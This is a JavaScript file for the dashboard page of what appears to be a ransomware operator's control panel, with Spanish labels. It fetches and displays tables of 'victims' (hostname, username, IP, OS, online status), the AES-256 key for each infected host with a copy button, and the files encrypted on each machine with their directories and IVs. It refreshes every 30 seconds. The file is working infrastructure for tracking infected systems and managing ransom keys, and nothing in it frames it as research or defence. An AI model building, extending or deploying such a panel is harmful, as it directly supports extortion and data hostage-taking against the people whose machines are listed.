// ===============================
// DATABASE PAGE LOGIC
// ===============================

let currentTab = 'victims';
let allData = {
  victims: [],
  keys: [],
  encrypted: []
};
let sortColumn = null;
let sortDirection = 'desc';

document.addEventListener('DOMContentLoaded', () => {
  console.log('Database page loaded');

  // Tab switching
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      currentTab = btn.dataset.tab;
      sortColumn = null; // Reset sort when changing tabs
      renderTable();
    });
  });

  // Filter input
  document.getElementById('filterInput').addEventListener('input', renderTable);

  // Initial load
  refreshData();

  // Auto-refresh every 30 seconds
  setInterval(refreshData, 30000);
});

async function refreshData() {
  try {
    // Load stats
    const statsRes = await fetch('/api/db/stats');
    const stats = await statsRes.json();
    document.getElementById('statVictims').textContent = stats.victims || 0;
    document.getElementById('statKeys').textContent = stats.keys || 0;
    document.getElementById('statEncrypted').textContent = stats.encrypted || 0;

    // Load all data
    const [victimsRes, keysRes, encryptedRes] = await Promise.all([
      fetch('/api/db/victims'),
      fetch('/api/db/keys'),
      fetch('/api/db/encrypted')
    ]);

    const victimsData = await victimsRes.json();
    const keysData = await keysRes.json();
    const encryptedData = await encryptedRes.json();

    allData.victims = victimsData.data || [];
    allData.keys = keysData.data || [];
    allData.encrypted = encryptedData.data || [];

    renderTable();
  } catch (e) {
    console.error('Error loading data:', e);
  }
}

function sortData(data, column) {
  if (!column) return data;

  return [...data].sort((a, b) => {
    let valA = a[column] || '';
    let valB = b[column] || '';

    // Handle dates
    if (column === 'created_at') {
      valA = new Date(valA).getTime();
      valB = new Date(valB).getTime();
    }

    if (typeof valA === 'string') valA = valA.toLowerCase();
    if (typeof valB === 'string') valB = valB.toLowerCase();

    if (sortDirection === 'asc') {
      return valA > valB ? 1 : valA < valB ? -1 : 0;
    } else {
      return valA < valB ? 1 : valA > valB ? -1 : 0;
    }
  });
}

function handleSort(column) {
  if (sortColumn === column) {
    sortDirection = sortDirection === 'asc' ? 'desc' : 'asc';
  } else {
    sortColumn = column;
    sortDirection = 'desc';
  }
  renderTable();
}

function renderTable() {
  const container = document.getElementById('tableContainer');
  const filter = document.getElementById('filterInput').value.toLowerCase();

  let data = allData[currentTab] || [];

  // Apply filter
  if (filter) {
    data = data.filter(row => {
      return Object.values(row).some(val =>
        String(val).toLowerCase().includes(filter)
      );
    });
  }

  // Apply sorting
  data = sortData(data, sortColumn);

  if (data.length === 0) {
    container.innerHTML = '<div class="no-data"><i class="ph ph-database" style="font-size:48px;"></i><p>No hay datos disponibles</p></div>';
    return;
  }

  let html = '';

  if (currentTab === 'victims') {
    html = renderVictimsTable(data);
  } else if (currentTab === 'keys') {
    html = renderKeysTable(data);
  } else if (currentTab === 'encrypted') {
    html = renderEncryptedTable(data);
  }

  container.innerHTML = html;
}

function getSortIcon(column) {
  if (sortColumn !== column) return '<i class="ph ph-caret-up-down" style="opacity:0.3;"></i>';
  return sortDirection === 'asc'
    ? '<i class="ph ph-caret-up" style="color:var(--primary);"></i>'
    : '<i class="ph ph-caret-down" style="color:var(--primary);"></i>';
}

function renderVictimsTable(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
          <th onclick="handleSort('username')" style="cursor:pointer;">Usuario ${getSortIcon('username')}</th>
          <th onclick="handleSort('ip')" style="cursor:pointer;">IP ${getSortIcon('ip')}</th>
          <th onclick="handleSort('platform')" style="cursor:pointer;">SO ${getSortIcon('platform')}</th>
          <th onclick="handleSort('arch')" style="cursor:pointer;">Arch ${getSortIcon('arch')}</th>
          <th onclick="handleSort('status')" style="cursor:pointer;">Estado ${getSortIcon('status')}</th>
          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 12)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.username || '-'}</td>
            <td>${row.ip || '-'}</td>
            <td>${formatPlatform(row.platform)}</td>
            <td>${row.arch || '-'}</td>
            <td class="${row.status === 'connected' ? 'status-connected' : 'status-disconnected'}">${row.status || '-'}</td>
            <td>${formatDate(row.created_at)}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderKeysTable(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
          <th onclick="handleSort('aes_key')" style="cursor:pointer;">Clave AES-256 ${getSortIcon('aes_key')}</th>
          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
          <th>Acciones</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 12)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td class="mono" style="max-width:350px;">
              <span title="${row.aes_key || ''}">${row.aes_key || '-'}</span>
            </td>
            <td>${formatDate(row.created_at)}</td>
            <td>
              <button onclick="copyToClipboard('${row.aes_key}')" class="copy-btn" title="Copiar clave">
                <i class="ph ph-copy"></i>
              </button>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderEncryptedTable(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
          <th onclick="handleSort('file_name')" style="cursor:pointer;">Archivo ${getSortIcon('file_name')}</th>
          <th onclick="handleSort('original_name')" style="cursor:pointer;">Original ${getSortIcon('original_name')}</th>
          <th onclick="handleSort('directory')" style="cursor:pointer;">Directorio ${getSortIcon('directory')}</th>
          <th onclick="handleSort('iv')" style="cursor:pointer;">IV ${getSortIcon('iv')}</th>
          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 10)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.file_name || '-'}</td>
            <td>${row.original_name || '-'}</td>
            <td title="${row.directory || ''}" style="max-width:180px; overflow:hidden; text-overflow:ellipsis;">${truncate(row.directory, 30)}</td>
            <td class="mono" title="${row.iv || ''}">${truncate(row.iv, 16)}</td>
            <td>${formatDate(row.created_at)}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function formatDate(dateStr) {
  if (!dateStr) return '-';
  const d = new Date(dateStr);
  return d.toLocaleDateString('es-ES') + ' ' + d.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
}

function formatPlatform(platform) {
  if (!platform) return '-';
  const labels = {
    'win32': 'Windows',
    'linux': 'Linux',
    'darwin': 'macOS'
  };
  return labels[platform] || platform;
}

function truncate(str, len) {
  if (!str) return '-';
  return str.length > len ? str.substring(0, len) + '...' : str;
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    alert('Clave copiada al portapapeles');
  }).catch(err => {
    console.error('Error al copiar:', err);
  });
}

// Global functions for onclick handlers
window.refreshData = refreshData;
window.handleSort = handleSort;
window.copyToClipboard = copyToClipboard;
